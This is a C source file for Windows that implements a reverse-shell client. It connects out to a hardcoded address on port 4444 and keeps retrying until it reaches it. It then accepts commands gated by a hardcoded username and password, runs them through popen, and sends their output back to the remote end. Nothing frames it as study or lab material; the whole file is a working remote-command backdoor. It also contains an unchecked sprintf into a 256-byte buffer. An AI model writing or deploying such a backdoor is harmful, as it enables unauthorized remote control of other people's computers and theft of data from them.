#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define PORT 4444
#define IP_ADDRESS "127.0.0.1"
#define BUFFER_SIZE 1048576
#define ID "255255255@windows"
#define USERNAME "user1"
#define PASSWORD "pass1"

SOCKET client_socket;

int manual_inet_pton(int af, const char *src, void *dst) {
    if (af == AF_INET) {
        unsigned char ip_bytes[4];
        if (sscanf(src, "%hhu.%hhu.%hhu.%hhu", &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) == 4) {
            memcpy(dst, ip_bytes, 4);
            return 1;
        }
        return 0;
    }
    return -1;
}

int connect_socket(const char* ip_address, int port) {
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);

    if (manual_inet_pton(AF_INET, ip_address, &server_address.sin_addr) <= 0) {
        printf("Manual InetPton failed\n");
        return 0;
    }

    if (connect(client_socket, (struct sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
        printf("Connect failed with error: %d\n", WSAGetLastError());
        return 0;
    }
    return 1;
}

int super_connect() {
    while (1) {
        if (connect_socket(IP_ADDRESS, PORT)) {
            return 1;
        }
        Sleep(2000);
    }
}
void handle(int suc) {
    char *buffer = (char *) malloc(BUFFER_SIZE);
    if (!buffer) {
        printf("Memory allocation failed.\n");
        exit(1);
    }

    char username[256], password[256], msg[BUFFER_SIZE];
    while (suc) {
        memset(buffer, 0, BUFFER_SIZE);

        int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if (bytesReceived == SOCKET_ERROR) {
            printf("recv failed with error: %d\n", WSAGetLastError());
            free(buffer);
            closesocket(client_socket);
            WSACleanup();
            exit(1);
        } else if (bytesReceived == 0) {
            printf("Connection closed by server.\n");
            free(buffer);
            closesocket(client_socket);
            WSACleanup();
            exit(1);
        }

        if (strcmp(buffer, "about.id") == 0) {
            send(client_socket, ID, strlen(ID), 0);
        } else {
            int scanCount = sscanf(buffer, "<%255[^>]>|<%255[^>]>|<%255[^>]>", username, password, msg);
            if (scanCount != 3 || strcmp(username, USERNAME) != 0 || strcmp(password, PASSWORD) != 0) {
                const char* error_msg = "Invalid username or password.";
                send(client_socket, error_msg, strlen(error_msg), 0);
            } else {
                // Run the command and capture its output
                char command_with_redirect[256];
                sprintf(command_with_redirect, "%s 2>&1", msg); // append '2>&1' to the command
                FILE *cmd_output = popen(command_with_redirect, "r");
                if (cmd_output == NULL) {
                    char *error_msg = "Error executing the command.";
                    send(client_socket, error_msg, strlen(error_msg), 0);
                } else {
                    char *output = NULL;
                    char line_buffer[BUFFER_SIZE];
                    size_t total_len = 0;

                    // Read the command output line by line and accumulate it in the output buffer
                    while (fgets(line_buffer, sizeof(line_buffer), cmd_output) != NULL) {
                        size_t line_len = strlen(line_buffer);
                        output = realloc(output, total_len + line_len + 1);
                        if (!output) {
                            printf("Memory reallocation failed.\n");
                            exit(1);
                        }
                        strncpy(output + total_len, line_buffer, line_len + 1);
                        total_len += line_len;
                    }

                    // Send the accumulated output back to the server
                    send(client_socket, output, total_len, 0);

                    free(output); // don't forget to free the memory
                    pclose(cmd_output);

                    Sleep(1);
                    send(client_socket, "1089f990-3641-4f3c-ace7-cc98f28f9d1d", 36, 0);
                }
            }
        }
    }
    free(buffer);
}

int main() {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        return 1;
    }

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET) {
        printf("Socket failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    int suc = super_connect();
    handle(suc);

    closesocket(client_socket);
    WSACleanup();
    return 0;
}
